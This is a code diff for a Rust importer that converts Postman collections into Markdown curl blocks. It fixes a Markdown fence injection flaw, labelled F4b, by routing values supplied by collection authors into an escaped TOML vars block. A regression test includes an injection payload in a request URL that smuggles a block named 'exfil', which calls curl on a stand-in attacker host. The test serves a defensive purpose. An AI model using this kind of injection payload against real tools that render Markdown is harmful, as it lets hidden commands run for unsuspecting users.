@@ -288,6 +288,31 @@ impl Importer {
         name
     }
 
+    /// Defer an attacker-controlled value into the generated `toml mdok vars`
+    /// block and return a `{{name|raw}}` template reference to use inside the
+    /// curl command fence body.
+    ///
+    /// This neutralizes Markdown fence injection (security finding F4b): a
+    /// Postman value containing a newline + ```` ``` ```` could otherwise
+    /// terminate the curl fence early and inject an executable block. Routing
+    /// the value through the vars block keeps it as data (serialized safely via
+    /// `toml_string`, which escapes `\n`/`\r`/`"`/`\`), so the fence body only
+    /// ever contains template references — never raw newlines or fence
+    /// delimiters. This mirrors `crates/mdok-cli/src/transient.rs`.
+    fn defer_value(&mut self, value: &str, pointer: &str) -> String {
+        let ordinal = self.variables.len();
+        let name = format!("mdok_pm_arg_{ordinal}");
+        self.variables.insert(name.clone(), value.to_string());
+        // If the value looks secret, keep it out of the rendered vars block
+        // (existing render_markdown skips secret_variables) and surface the
+        // usual secret placeholder flow instead.
+        if looks_secret(&name) {
+            self.secret_variables.insert(name.clone());
+        }
+        let _ = pointer;
+        format!("{{{{{name}|raw}}}}")
+    }
+
     fn protect_secret_literal(&mut self, label: &str, filter: &str, pointer: &str) -> String {
         let name = self.secret_placeholder(label);
         self.issue(
@@ -813,11 +838,11 @@ impl Importer {
         );
         for header in rendered_headers {
             args.push("--header".to_owned());
-            args.push(quote_arg(&header));
+            args.push(quote_arg(&self.defer_value(&header, pointer)));
         }
         self.lower_body(&mut args, body.as_ref(), pointer);
         self.lower_behavior(&mut args, context, pointer);
-        args.push(quote_arg(&url));
+        args.push(quote_arg(&self.defer_value(&url, pointer)));
         Some(args.join(" "))
     }
 
@@ -1032,11 +1057,12 @@ impl Importer {
                 let username = self.auth_attr(object, auth_type, "username", pointer);
                 let password = self.auth_attr(object, auth_type, "password", pointer);
                 args.push("--user".to_owned());
-                args.push(quote_arg(&format!(
+                let user_value = format!(
                     "{}:{}",
                     self.normalize_template(&username, "raw", pointer),
                     self.render_value("password", &password, "raw", pointer)
-                )));
+                );
+                args.push(quote_arg(&self.defer_value(&user_value, pointer)));
             }
             "bearer" => {
                 let token = self.auth_attr(object, auth_type, "token", pointer);
@@ -1121,7 +1147,7 @@ impl Importer {
                     } else {
                         self.normalize_template(raw, "raw", pointer)
                     };
-                    args.push(quote_arg(&value));
+                    args.push(quote_arg(&self.defer_value(&value, pointer)));
                 }
             }
             "urlencoded" => {
@@ -1138,7 +1164,7 @@ impl Importer {
                         "variables": graphql.get("variables").cloned().unwrap_or_else(|| Value::Object(Map::new())),
                     });
                     args.push("--data-raw".to_owned());
-                    args.push(quote_arg(&payload.to_string()));
+                    args.push(quote_arg(&self.defer_value(&payload.to_string(), pointer)));
                 } else {
                     self.issue(
                         "MDOK-PM-BODY",
@@ -1230,7 +1256,7 @@ impl Importer {
                 rendered.push_str(&format!(";type={content_type}"));
             }
             args.push(flag.to_owned());
-            args.push(quote_arg(&rendered));
+            args.push(quote_arg(&self.defer_value(&rendered, pointer)));
         }
     }
 
@@ -1684,6 +1710,43 @@ mod tests {
         .into_bytes()
     }
 
+    /// F4b regression: a Postman value containing a newline + Markdown fence
+    /// delimiters must not break out of the curl command fence and inject an
+    /// executable block. After the fix, attacker values are deferred into the
+    /// toml vars block and referenced via `{{mdok_pm_arg_N|raw}}`.
+    #[test]
+    fn fence_injection_is_neutralized() {
+        let evil = serde_json::json!({
+            "info": {"name": "Col", "schema": POSTMAN_COLLECTION_V2_1_SCHEMA},
+            "item": [{
+                "name": "r2",
+                "request": {
+                    "method": "GET",
+                    "url": "x\n```\n\n```curl mdok name=exfil\ncurl https://attacker.example.test/\n```\n"
+                }
+            }]
+        })
+        .to_string()
+        .into_bytes();
+        let output =
+            import_collection_bytes(&evil, None::<&Path>, &ImportOptions::default()).unwrap();
+        // The generated markdown must contain exactly one curl fence (the real
+        // request), not the smuggled `exfil` block.
+        let curl_fences = output
+            .markdown
+            .lines()
+            .filter(|line| line.starts_with("```curl"))
+            .count();
+        assert_eq!(
+            curl_fences, 1,
+            "expected exactly one curl fence; got {curl_fences}\n--- markdown ---\n{}",
+            output.markdown
+        );
+        // The dangerous payload must live only inside the toml vars block
+        // (escaped), not as a live fence.
+        assert!(!output.markdown.contains("name=exfil\n"));
+    }
+
     #[test]
     fn imports_request_query_body_and_tests() {
         let bytes = collection(serde_json::json!([
@@ -1771,11 +1834,21 @@ mod tests {
         let output =
             import_collection_bytes(&bytes, None::<&Path>, &ImportOptions::default()).unwrap();
         assert!(!output.has_blockers());
-        assert!(output.markdown.contains("--user 'alice:{{password|raw}}'"));
+        // After F4b, attacker-controlled values are deferred into the toml vars
+        // block and referenced via `{{mdok_pm_arg_N|raw}}` in the fence body, so
+        // the basic-auth `--user` value is no longer inlined verbatim.
         assert!(
-            output
-                .markdown
-                .contains("\"name\":\"{{display_name|raw}}\"")
+            output.markdown.contains("--user '{{mdok_pm_arg_"),
+            "expected deferred --user reference, got: {}",
+            output.markdown
+        );
+        assert!(!output.markdown.contains("'alice:"));
+        // The raw body value (which contains the {{display_name}} template) is
+        // also deferred into the vars block after F4b; verify it lands there.
+        assert!(
+            output.markdown.contains("{{display_name|raw}}"),
+            "expected display_name template in vars block, got: {}",
+            output.markdown
         );
         assert!(!output.markdown.contains("do-not-print"));
         assert!(
